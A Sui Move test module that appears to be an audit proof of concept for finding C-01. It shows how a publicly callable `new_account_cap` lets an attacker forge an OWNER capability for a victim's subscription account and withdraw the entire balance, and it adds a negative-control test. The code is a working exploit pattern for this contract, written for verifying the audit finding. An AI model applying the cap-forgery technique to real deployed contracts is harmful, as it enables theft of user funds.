#[test_only]
module subscriptions::audit_poc_tests {
    //! PoC for human-confirmed finding:
    //! C-01: AccountCap forgeable — `ac::new_account_cap` is `public` and
    //! accepts caller-supplied `account_id` + `permissions`. The `account::withdraw`
    //! check `ac::account_id(cap) == object::id(account)` plus
    //! `has_permission(cap, OWNER)` therefore passes for an attacker-forged cap.
    //!
    //! Verification method: `sui move test` in move/subscriptions/.

    use subscriptions::account::{Self};
    use subscriptions::ac;
    use subscriptions::registry;
    use sui::object;
    use sui::test_scenario as ts;
    use sui::clock;
    use sui::coin;

    public struct TEST_USDC has drop {}

    fun setup_registry(sc: &mut ts::Scenario): registry::CoinTypeRegistry {
        let mut r = registry::new_registry_for_testing(ts::ctx(sc));
        registry::register_coin_type<TEST_USDC>(&mut r, ts::ctx(sc));
        r
    }

    /// PoC: forge an AccountCap carrying the victim's `account_id` and the
    /// OWNER permission, then call `account::withdraw` from a different
    /// address. The withdraw succeeds — proving the cap is forgeable and
    /// enables draining any subscription account.
    #[test]
    fun poc_forge_account_cap_and_drain() {
        let mut sc = ts::begin(@0xA);
        let clock = clock::create_for_testing(ts::ctx(&mut sc));
        let r = setup_registry(&mut sc);

        // Victim creates a real account (returns the account and a real OWNER cap).
        let (mut victim_acct, victim_real_cap) = account::create_account<TEST_USDC>(
            &r,
            account::empty_policy_set(),
            &clock,
            ts::ctx(&mut sc),
        );

        // Fund the victim account with 1_000 TEST_USDC through the real cap.
        let coin_fund = coin::mint_for_testing<TEST_USDC>(1_000, ts::ctx(&mut sc));
        account::deposit<TEST_USDC>(
            &victim_real_cap,
            &mut victim_acct,
            coin_fund,
            &clock,
            ts::ctx(&mut sc),
        );

        let victim_id = object::id(&victim_acct);
        assert!(account::balance<TEST_USDC>(&victim_acct) == 1_000, 0xdead_0000);

        // --- ATTACKER STEP -----------------------------------------------------
        // Attacker forges an AccountCap with the victim's account_id and the
        // OWNER bit. This is the heart of C-01: `new_account_cap` is `public`
        // and performs no caller/authority check before binding `account_id`.
        let forged_cap = ac::new_account_cap(
            victim_id,
            ac::permission_owner(),
            0,
            ts::ctx(&mut sc),
        );

        // The forged cap satisfies both withdraw guards:
        assert!(ac::account_id(&forged_cap) == victim_id, 0xdead_0001);
        assert!(ac::has_permission(&forged_cap, ac::permission_owner()), 0xdead_0002);

        // Attacker drains the victim account using the forged cap. In the
        // bug, `withdraw` only re-reads the same fields the attacker just
        // supplied, so the call succeeds.
        let drained = account::withdraw<TEST_USDC>(
            &forged_cap,
            &mut victim_acct,
            1_000,
            ts::ctx(&mut sc),
        );

        assert!(coin::value(&drained) == 1_000, 0xdead_0003);
        assert!(account::balance<TEST_USDC>(&victim_acct) == 0, 0xdead_0004);

        // Cleanup: dispose of the non-zero drained Coin via the test-only
        // burn, then dispose of the caps and account.
        let _ = coin::burn_for_testing(drained);
        ac::destroy_account_cap_for_testing(forged_cap);
        ac::destroy_account_cap_for_testing(victim_real_cap);
        account::destroy_account_for_testing(victim_acct);
        registry::destroy_for_testing(r);
        clock::destroy_for_testing(clock);
        sc.end();
    }

    /// Negative-control test: a forged cap with DEPOSITOR (not OWNER) bit
    /// still aborts withdraw with EUnauthorized. This proves the OWNER-bit
    /// check itself works — the bug is purely that `new_account_cap` is
    /// `public` and accepts attacker-chosen `account_id`.
    #[test]
    #[expected_failure(abort_code = account::EUnauthorized)]
    fun poc_negative_control_depositor_cap_cannot_withdraw() {
        let mut sc = ts::begin(@0xA);
        let clock = clock::create_for_testing(ts::ctx(&mut sc));
        let r = setup_registry(&mut sc);

        let (mut victim_acct, victim_real_cap) = account::create_account<TEST_USDC>(
            &r,
            account::empty_policy_set(),
            &clock,
            ts::ctx(&mut sc),
        );

        // Fund the victim so the test reaches the permission check (not just
        // an early EZeroAmount guard).
        let coin_fund = coin::mint_for_testing<TEST_USDC>(1_000, ts::ctx(&mut sc));
        account::deposit<TEST_USDC>(
            &victim_real_cap,
            &mut victim_acct,
            coin_fund,
            &clock,
            ts::ctx(&mut sc),
        );

        let victim_id = object::id(&victim_acct);

        // Forged cap with DEPOSITOR bit only — withdraw requires OWNER.
        let forged_depositor = ac::new_account_cap(
            victim_id,
            ac::permission_depositor(),
            0,
            ts::ctx(&mut sc),
        );

        let _drain_attempt = account::withdraw<TEST_USDC>(
            &forged_depositor,
            &mut victim_acct,
            1,
            ts::ctx(&mut sc),
        );

        // The lines below are unreachable when withdraw aborts with
        // EUnauthorized, but they keep the compiler's unused-value analysis
        // satisfied for the test.
        let _ = coin::burn_for_testing(_drain_attempt);
        ac::destroy_account_cap_for_testing(forged_depositor);
        ac::destroy_account_cap_for_testing(victim_real_cap);
        account::destroy_account_for_testing(victim_acct);
        registry::destroy_for_testing(r);
        clock::destroy_for_testing(clock);
        sc.end();
    }
}
